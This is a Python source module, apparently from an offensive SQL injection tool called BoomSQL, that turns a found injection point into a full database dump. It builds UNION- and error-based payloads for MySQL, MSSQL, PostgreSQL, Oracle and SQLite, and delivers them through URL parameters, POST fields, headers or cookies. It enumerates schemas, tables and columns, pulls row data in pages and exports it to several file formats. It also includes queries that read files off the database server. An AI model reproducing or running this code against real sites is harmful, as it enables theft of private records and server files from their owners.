"""
Database Dumper for BoomSQL
Advanced database enumeration and dumping capabilities
"""

import asyncio
import json
import csv
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Union
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
import re
import time
import html

from .fallbacks import aiohttp, ClientSession, AIOHTTP_AVAILABLE
from .sql_injection_engine import VulnerabilityResult, DatabaseType, InjectionType, InjectionVector
from .logger import LoggerMixin

class ExportFormat(Enum):
    """Export formats"""
    JSON = "json"
    CSV = "csv"
    XML = "xml"
    SQL = "sql"
    HTML = "html"

@dataclass
class DatabaseInfo:
    """Database information"""
    name: str
    version: str
    user: str
    hostname: str
    port: int = 0
    tables: List['TableInfo'] = field(default_factory=list)
    
@dataclass
class TableInfo:
    """Table information"""
    name: str
    schema: str
    row_count: int
    columns: List['ColumnInfo'] = field(default_factory=list)
    data: List[Dict[str, Any]] = field(default_factory=list)
    
@dataclass
class ColumnInfo:
    """Column information"""
    name: str
    type: str
    length: int
    nullable: bool
    default: str = ""
    primary_key: bool = False
    
@dataclass
class DumpProgress:
    """Dump progress information"""
    current_database: str
    current_table: str
    current_column: str
    total_databases: int
    completed_databases: int
    total_tables: int
    completed_tables: int
    total_rows: int
    completed_rows: int
    start_time: datetime
    estimated_completion: datetime = None
    
    @property
    def progress_percentage(self) -> float:
        """Calculate overall progress percentage"""
        if self.total_rows == 0:
            return 0.0
        return (self.completed_rows / self.total_rows) * 100
        
    @property
    def time_elapsed(self) -> float:
        """Get elapsed time in seconds"""
        return (datetime.now() - self.start_time).total_seconds()
        
    @property
    def estimated_time_remaining(self) -> float:
        """Estimate time remaining in seconds"""
        if self.completed_rows == 0:
            return 0.0
        elapsed = self.time_elapsed
        rate = self.completed_rows / elapsed
        remaining_rows = self.total_rows - self.completed_rows
        return remaining_rows / rate if rate > 0 else 0.0

class DatabaseDumper(LoggerMixin):
    """Advanced database dumper with support for multiple database types"""
    
    def __init__(self, vulnerability: VulnerabilityResult, config: Dict[str, Any]):
        self.vulnerability = vulnerability
        self.config = config
        self.session = None
        self.database_info = None
        self.progress = None
        self.is_dumping = False
        self.cancel_requested = False
        
        # Database-specific queries
        self.queries = self.get_database_queries()
        
        # Initialize session
        self.init_session()
        
    def init_session(self):
        """Initialize aiohttp session"""
        if AIOHTTP_AVAILABLE:
            timeout = aiohttp.ClientTimeout(total=self.config.get("RequestTimeout", 30))
            connector = aiohttp.TCPConnector(
                limit=self.config.get("MaxThreads", 3),
                ssl=False
            )
            
            self.session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers={
                    'User-Agent': self.config.get("UserAgent", "BoomSQL/2.0"),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                }
            )
        else:
            # Use fallback session
            self.session = ClientSession()
        
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
            
    def get_database_queries(self) -> Dict[DatabaseType, Dict[str, str]]:
        """Get database-specific queries for enumeration"""
        return {
            DatabaseType.MYSQL: {
                "version": "SELECT version()",
                "user": "SELECT user()",
                "hostname": "SELECT @@hostname",
                "databases": "SELECT schema_name FROM information_schema.schemata",
                "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='{database}'",
                "columns": "SELECT column_name, data_type, is_nullable, column_default, character_maximum_length FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
                "data": "SELECT {columns} FROM {database}.{table} LIMIT {limit} OFFSET {offset}",
                "privileges": "SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%{user}%'",
                "files": "SELECT LOAD_FILE('{file}')"
            },
            DatabaseType.MSSQL: {
                "version": "SELECT @@version",
                "user": "SELECT SYSTEM_USER",
                "hostname": "SELECT @@servername",
                "databases": "SELECT name FROM sys.databases",
                "tables": "SELECT name FROM {database}.sys.tables",
                "columns": "SELECT c.name, t.name as type, c.is_nullable, c.default_object_id, c.max_length FROM {database}.sys.columns c JOIN {database}.sys.types t ON c.user_type_id = t.user_type_id WHERE object_id = OBJECT_ID('{database}.dbo.{table}')",
                "row_count": "SELECT COUNT(*) FROM {database}.dbo.{table}",
                "data": "SELECT {columns} FROM {database}.dbo.{table} ORDER BY (SELECT NULL) OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY",
                "privileges": "SELECT * FROM fn_my_permissions(NULL, 'SERVER')",
                "files": "SELECT BulkColumn FROM OPENROWSET(BULK '{file}', SINGLE_BLOB) AS x"
            },
            DatabaseType.POSTGRESQL: {
                "version": "SELECT version()",
                "user": "SELECT current_user",
                "hostname": "SELECT inet_server_addr()",
                "databases": "SELECT datname FROM pg_database",
                "tables": "SELECT tablename FROM pg_tables WHERE schemaname='{database}'",
                "columns": "SELECT column_name, data_type, is_nullable, column_default, character_maximum_length FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
                "data": "SELECT {columns} FROM {database}.{table} LIMIT {limit} OFFSET {offset}",
                "privileges": "SELECT * FROM information_schema.table_privileges WHERE grantee='{user}'",
                "files": "SELECT pg_read_file('{file}')"
            },
            DatabaseType.ORACLE: {
                "version": "SELECT banner FROM v$version WHERE rownum=1",
                "user": "SELECT user FROM dual",
                "hostname": "SELECT host_name FROM v$instance",
                "databases": "SELECT username FROM all_users",
                "tables": "SELECT table_name FROM all_tables WHERE owner='{database}'",
                "columns": "SELECT column_name, data_type, nullable, data_default, data_length FROM all_tab_columns WHERE owner='{database}' AND table_name='{table}'",
                "row_count": "SELECT COUNT(*) FROM {database}.{table}",
                "data": "SELECT {columns} FROM {database}.{table} WHERE rownum BETWEEN {offset}+1 AND {offset}+{limit}",
                "privileges": "SELECT * FROM session_privs",
                "files": "SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('{path}', '{file}', 'R'), 1) FROM dual"
            },
            DatabaseType.SQLITE: {
                "version": "SELECT sqlite_version()",
                "user": "SELECT 'sqlite' as user",
                "hostname": "SELECT 'localhost' as hostname",
                "databases": "SELECT name FROM sqlite_master WHERE type='table'",
                "tables": "SELECT name FROM sqlite_master WHERE type='table'",
                "columns": "PRAGMA table_info({table})",
                "row_count": "SELECT COUNT(*) FROM {table}",
                "data": "SELECT {columns} FROM {table} LIMIT {limit} OFFSET {offset}",
                "privileges": "SELECT 'No privileges system' as privileges",
                "files": "SELECT 'File operations not supported' as files"
            }
        }
        
    async def enumerate_database(self, callback=None) -> DatabaseInfo:
        """Enumerate database structure"""
        self.log_info("Starting database enumeration")
        
        db_type = self.vulnerability.database_type
        if db_type not in self.queries:
            raise ValueError(f"Unsupported database type: {db_type}")
            
        queries = self.queries[db_type]
        
        # Get basic database info
        version = await self.execute_query(queries["version"])
        user = await self.execute_query(queries["user"])
        hostname = await self.execute_query(queries["hostname"])
        
        self.database_info = DatabaseInfo(
            name="",
            version=version or "Unknown",
            user=user or "Unknown",
            hostname=hostname or "Unknown"
        )
        
        if callback:
            callback(f"Database: {db_type.value}, Version: {version}, User: {user}")
            
        # Get databases/schemas
        databases = await self.execute_query(queries["databases"])
        if databases:
            database_list = self.parse_query_result(databases)
            for db_name in database_list:
                if callback:
                    callback(f"Found database: {db_name}")
                    
        # Get tables for each database
        if database_list:
            for db_name in database_list[:5]:  # Limit to first 5 databases
                tables = await self.execute_query(queries["tables"].format(database=db_name))
                if tables:
                    table_list = self.parse_query_result(tables)
                    for table_name in table_list:
                        if callback:
                            callback(f"Found table: {db_name}.{table_name}")
                            
                        # Get columns for each table
                        columns = await self.execute_query(queries["columns"].format(database=db_name, table=table_name))
                        if columns:
                            column_list = self.parse_column_info(columns, db_type)
                            
                            table_info = TableInfo(
                                name=table_name,
                                schema=db_name,
                                row_count=0,
                                columns=column_list
                            )
                            
                            # Get row count
                            row_count = await self.execute_query(queries["row_count"].format(database=db_name, table=table_name))
                            if row_count:
                                try:
                                    table_info.row_count = int(row_count.strip())
                                except ValueError:
                                    table_info.row_count = 0
                                    
                            self.database_info.tables.append(table_info)
                            
        self.log_info("Database enumeration completed")
        return self.database_info
        
    async def dump_database(self, database_info: DatabaseInfo = None, callback=None) -> DatabaseInfo:
        """Dump complete database contents"""
        if database_info is None:
            database_info = self.database_info
            
        if not database_info:
            raise ValueError("Database information not available. Run enumerate_database first.")
            
        self.log_info("Starting database dump")
        self.is_dumping = True
        self.cancel_requested = False
        
        # Initialize progress
        total_rows = sum(table.row_count for table in database_info.tables)
        self.progress = DumpProgress(
            current_database="",
            current_table="",
            current_column="",
            total_databases=len(set(table.schema for table in database_info.tables)),
            completed_databases=0,
            total_tables=len(database_info.tables),
            completed_tables=0,
            total_rows=total_rows,
            completed_rows=0,
            start_time=datetime.now()
        )
        
        db_type = self.vulnerability.database_type
        queries = self.queries[db_type]
        
        # Dump each table
        for table in database_info.tables:
            if self.cancel_requested:
                break
                
            self.progress.current_database = table.schema
            self.progress.current_table = table.name
            
            if callback:
                callback(f"Dumping table: {table.schema}.{table.name}")
                
            # Dump table data in chunks
            page_size = self.config.get("PageSize", 100)
            offset = 0
            
            while offset < table.row_count:
                if self.cancel_requested:
                    break
                    
                # Build column list
                column_names = [col.name for col in table.columns]
                columns_str = ", ".join(column_names)
                
                # Execute query
                data_query = queries["data"].format(
                    database=table.schema,
                    table=table.name,
                    columns=columns_str,
                    limit=page_size,
                    offset=offset
                )
                
                data_result = await self.execute_query(data_query)
                if data_result:
                    rows = self.parse_data_result(data_result, column_names)
                    table.data.extend(rows)
                    
                    self.progress.completed_rows += len(rows)
                    
                    if callback:
                        callback(f"Dumped {len(rows)} rows from {table.schema}.{table.name}")
                        
                offset += page_size
                
                # Add delay between requests
                await asyncio.sleep(self.config.get("RequestDelay", 1000) / 1000)
                
            self.progress.completed_tables += 1
            
        self.is_dumping = False
        self.log_info("Database dump completed")
        return database_info
        
    async def execute_query(self, query: str) -> Optional[str]:
        """Execute a query using the SQL injection vulnerability"""
        try:
            # Modify the query based on injection type
            if self.vulnerability.injection_type == InjectionType.UNION_BASED:
                # For UNION-based, inject the query into the UNION SELECT
                injection_query = f"' UNION SELECT ({query}) --"
            elif self.vulnerability.injection_type == InjectionType.ERROR_BASED:
                # For error-based, use extraction functions
                if self.vulnerability.database_type == DatabaseType.MYSQL:
                    injection_query = f"' AND ExtractValue(1, concat(0x7e, ({query}), 0x7e)) --"
                elif self.vulnerability.database_type == DatabaseType.MSSQL:
                    injection_query = f"' AND CAST(({query}) AS INT) --"
                else:
                    injection_query = f"' AND ({query}) --"
            else:
                # Generic injection
                injection_query = f"' AND ({query}) --"
                
            # Prepare the request
            modified_url, modified_data, modified_headers, modified_cookies = self.prepare_injection_request(injection_query)
            
            # Execute the request
            if self.vulnerability.injection_point.vector == InjectionVector.GET_PARAMETER:
                async with self.session.get(modified_url, headers=modified_headers, cookies=modified_cookies) as response:
                    content = await response.text()
                    return self.extract_result(content)
            else:
                async with self.session.post(modified_url, data=modified_data, headers=modified_headers, cookies=modified_cookies) as response:
                    content = await response.text()
                    return self.extract_result(content)
                    
        except Exception as e:
            self.log_error(f"Error executing query: {e}")
            return None
            
    def prepare_injection_request(self, injection_query: str):
        """Prepare the injection request"""
        # This is a simplified version - in practice, you'd use the exact same
        # method as the original vulnerability was detected
        url = self.vulnerability.url
        injection_point = self.vulnerability.injection_point
        
        # Replace the original payload with our query
        if injection_point.vector == InjectionVector.GET_PARAMETER:
            # Modify URL parameter
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[injection_point.name] = [injection_query]
            query_string = urlencode(params, doseq=True)
            modified_url = urlunparse((
                parsed_url.scheme, parsed_url.netloc, parsed_url.path,
                parsed_url.params, query_string, parsed_url.fragment
            ))
            return modified_url, {}, {}, {}
            
        elif injection_point.vector == InjectionVector.POST_PARAMETER:
            # Modify POST data
            return url, {injection_point.name: injection_query}, {}, {}
            
        elif injection_point.vector == InjectionVector.HEADER:
            # Modify header
            return url, {}, {injection_point.name: injection_query}, {}
            
        elif injection_point.vector == InjectionVector.COOKIE:
            # Modify cookie
            return url, {}, {}, {injection_point.name: injection_query}
            
        return url, {}, {}, {}
        
    def extract_result(self, content: str) -> Optional[str]:
        """Extract query result from response content"""
        # This depends on the injection type and database
        if self.vulnerability.injection_type == InjectionType.ERROR_BASED:
            # Look for error patterns with our data
            if self.vulnerability.database_type == DatabaseType.MYSQL:
                # Look for ExtractValue error output
                match = re.search(r'~([^~]+)~', content)
                if match:
                    return match.group(1)
                    
            elif self.vulnerability.database_type == DatabaseType.MSSQL:
                # Look for CAST error output
                match = re.search(r'Conversion failed when converting.*\'(.+)\'', content)
                if match:
                    return match.group(1)
                    
        elif self.vulnerability.injection_type == InjectionType.UNION_BASED:
            # For UNION-based, look for the injected data in the response
            # This is database and context specific
            pass
            
        return None
        
    def parse_query_result(self, result: str) -> List[str]:
        """Parse query result into list of values"""
        if not result:
            return []
            
        # Simple parsing - in practice, this would be more sophisticated
        lines = result.strip().split('\n')
        return [line.strip() for line in lines if line.strip()]
        
    def parse_column_info(self, result: str, db_type: DatabaseType) -> List[ColumnInfo]:
        """Parse column information result"""
        columns = []
        
        if not result:
            return columns
            
        lines = result.strip().split('\n')
        for line in lines:
            if not line.strip():
                continue
                
            # Parse based on database type
            if db_type == DatabaseType.MYSQL:
                # Expected format: column_name, data_type, is_nullable, column_default, character_maximum_length
                parts = line.split(',')
                if len(parts) >= 2:
                    columns.append(ColumnInfo(
                        name=parts[0].strip(),
                        type=parts[1].strip(),
                        length=int(parts[4].strip()) if len(parts) > 4 and parts[4].strip().isdigit() else 0,
                        nullable=parts[2].strip().lower() == 'yes' if len(parts) > 2 else True,
                        default=parts[3].strip() if len(parts) > 3 else ""
                    ))
            else:
                # Generic parsing
                parts = line.split(',')
                if len(parts) >= 2:
                    columns.append(ColumnInfo(
                        name=parts[0].strip(),
                        type=parts[1].strip(),
                        length=0,
                        nullable=True
                    ))
                    
        return columns
        
    def parse_data_result(self, result: str, column_names: List[str]) -> List[Dict[str, Any]]:
        """Parse data result into list of dictionaries"""
        rows = []
        
        if not result:
            return rows
            
        lines = result.strip().split('\n')
        for line in lines:
            if not line.strip():
                continue
                
            # Parse row data
            values = line.split(',')
            if len(values) == len(column_names):
                row = {}
                for i, col_name in enumerate(column_names):
                    row[col_name] = values[i].strip()
                rows.append(row)
                
        return rows
        
    def cancel_dump(self):
        """Cancel the current dump operation"""
        self.cancel_requested = True
        self.log_info("Dump cancellation requested")
        
    def export_data(self, database_info: DatabaseInfo, format: ExportFormat, output_file: str):
        """Export database data to file"""
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        
        if format == ExportFormat.JSON:
            self.export_json(database_info, output_path)
        elif format == ExportFormat.CSV:
            self.export_csv(database_info, output_path)
        elif format == ExportFormat.XML:
            self.export_xml(database_info, output_path)
        elif format == ExportFormat.SQL:
            self.export_sql(database_info, output_path)
        elif format == ExportFormat.HTML:
            self.export_html(database_info, output_path)
            
        self.log_info(f"Data exported to {output_path}")
        
    def export_json(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to JSON format"""
        data = {
            "database_info": {
                "name": database_info.name,
                "version": database_info.version,
                "user": database_info.user,
                "hostname": database_info.hostname
            },
            "tables": []
        }
        
        for table in database_info.tables:
            table_data = {
                "name": table.name,
                "schema": table.schema,
                "row_count": table.row_count,
                "columns": [
                    {
                        "name": col.name,
                        "type": col.type,
                        "length": col.length,
                        "nullable": col.nullable,
                        "default": col.default,
                        "primary_key": col.primary_key
                    }
                    for col in table.columns
                ],
                "data": table.data
            }
            data["tables"].append(table_data)
            
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
            
    def export_csv(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to CSV format"""
        # Create a CSV file for each table
        for table in database_info.tables:
            table_file = output_path.parent / f"{output_path.stem}_{table.schema}_{table.name}.csv"
            
            if table.data:
                with open(table_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=table.data[0].keys())
                    writer.writeheader()
                    writer.writerows(table.data)
                    
    def export_xml(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to XML format"""
        root = ET.Element("database")
        
        # Database info
        info_elem = ET.SubElement(root, "info")
        ET.SubElement(info_elem, "name").text = database_info.name
        ET.SubElement(info_elem, "version").text = database_info.version
        ET.SubElement(info_elem, "user").text = database_info.user
        ET.SubElement(info_elem, "hostname").text = database_info.hostname
        
        # Tables
        tables_elem = ET.SubElement(root, "tables")
        for table in database_info.tables:
            table_elem = ET.SubElement(tables_elem, "table")
            table_elem.set("name", table.name)
            table_elem.set("schema", table.schema)
            table_elem.set("row_count", str(table.row_count))
            
            # Columns
            columns_elem = ET.SubElement(table_elem, "columns")
            for col in table.columns:
                col_elem = ET.SubElement(columns_elem, "column")
                col_elem.set("name", col.name)
                col_elem.set("type", col.type)
                col_elem.set("length", str(col.length))
                col_elem.set("nullable", str(col.nullable))
                col_elem.set("default", col.default)
                col_elem.set("primary_key", str(col.primary_key))
                
            # Data
            data_elem = ET.SubElement(table_elem, "data")
            for row in table.data:
                row_elem = ET.SubElement(data_elem, "row")
                for col_name, value in row.items():
                    col_elem = ET.SubElement(row_elem, "column")
                    col_elem.set("name", col_name)
                    col_elem.text = str(value)
                    
        # Write to file
        tree = ET.ElementTree(root)
        tree.write(output_path, encoding='utf-8', xml_declaration=True)
        
    def export_sql(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to SQL format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(f"-- Database dump generated by BoomSQL\n")
            f.write(f"-- Database: {database_info.name}\n")
            f.write(f"-- Version: {database_info.version}\n")
            f.write(f"-- User: {database_info.user}\n")
            f.write(f"-- Hostname: {database_info.hostname}\n")
            f.write(f"-- Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for table in database_info.tables:
                # Create table statement
                f.write(f"-- Table: {table.schema}.{table.name}\n")
                f.write(f"DROP TABLE IF EXISTS `{table.name}`;\n")
                f.write(f"CREATE TABLE `{table.name}` (\n")
                
                col_definitions = []
                for col in table.columns:
                    col_def = f"  `{col.name}` {col.type}"
                    if col.length > 0:
                        col_def += f"({col.length})"
                    if not col.nullable:
                        col_def += " NOT NULL"
                    if col.default:
                        col_def += f" DEFAULT '{col.default}'"
                    if col.primary_key:
                        col_def += " PRIMARY KEY"
                    col_definitions.append(col_def)
                    
                f.write(",\n".join(col_definitions))
                f.write("\n);\n\n")
                
                # Insert data
                if table.data:
                    f.write(f"-- Data for table: {table.name}\n")
                    for row in table.data:
                        values = []
                        for col in table.columns:
                            value = row.get(col.name, "")
                            if value is None:
                                values.append("NULL")
                            else:
                                escaped_value = str(value).replace("'", "\'")
                                values.append(f"'{escaped_value}'")
                        f.write(f"INSERT INTO `{table.name}` VALUES ({', '.join(values)});\n")
                    f.write("\n")
                    
    def export_html(self, database_info: DatabaseInfo, output_path: Path):
        """Export data to HTML format"""
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>Database Dump - BoomSQL</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #f0f0f0; padding: 10px; border-radius: 5px; }
        .table { margin: 20px 0; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .table-info { background-color: #e9f5ff; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
""")
            
            # Database info
            f.write(f"""
    <div class="header">
        <h1>Database Dump Report</h1>
        <p><strong>Database:</strong> {html.escape(database_info.name)}</p>
        <p><strong>Version:</strong> {html.escape(database_info.version)}</p>
        <p><strong>User:</strong> {html.escape(database_info.user)}</p>
        <p><strong>Hostname:</strong> {html.escape(database_info.hostname)}</p>
        <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
""")
            
            # Tables
            for table in database_info.tables:
                f.write(f"""
    <div class="table">
        <h2>Table: {html.escape(table.schema)}.{html.escape(table.name)}</h2>
        <div class="table-info">
            <p><strong>Row Count:</strong> {table.row_count}</p>
            <p><strong>Columns:</strong> {len(table.columns)}</p>
        </div>
        
        <h3>Structure</h3>
        <table>
            <tr>
                <th>Column</th>
                <th>Type</th>
                <th>Length</th>
                <th>Nullable</th>
                <th>Default</th>
                <th>Primary Key</th>
            </tr>
""")
                
                for col in table.columns:
                    f.write(f"""
            <tr>
                <td>{html.escape(col.name)}</td>
                <td>{html.escape(col.type)}</td>
                <td>{col.length}</td>
                <td>{'Yes' if col.nullable else 'No'}</td>
                <td>{html.escape(col.default)}</td>
                <td>{'Yes' if col.primary_key else 'No'}</td>
            </tr>
""")
                
                f.write("        </table>\n")
                
                # Data
                if table.data:
                    f.write(f"""
        <h3>Data (First 100 rows)</h3>
        <table>
            <tr>
""")
                    for col in table.columns:
                        f.write(f"                <th>{html.escape(col.name)}</th>\n")
                    f.write("            </tr>\n")
                    
                    for row in table.data[:100]:  # Limit to first 100 rows
                        f.write("            <tr>\n")
                        for col in table.columns:
                            value = row.get(col.name, "")
                            f.write(f"                <td>{html.escape(str(value))}</td>\n")
                        f.write("            </tr>\n")
                    
                    f.write("        </table>\n")
                    
                f.write("    </div>\n")
                
            f.write("""
</body>
</html>
""")
            
    def get_progress(self) -> Optional[DumpProgress]:
        """Get current dump progress"""
        return self.progress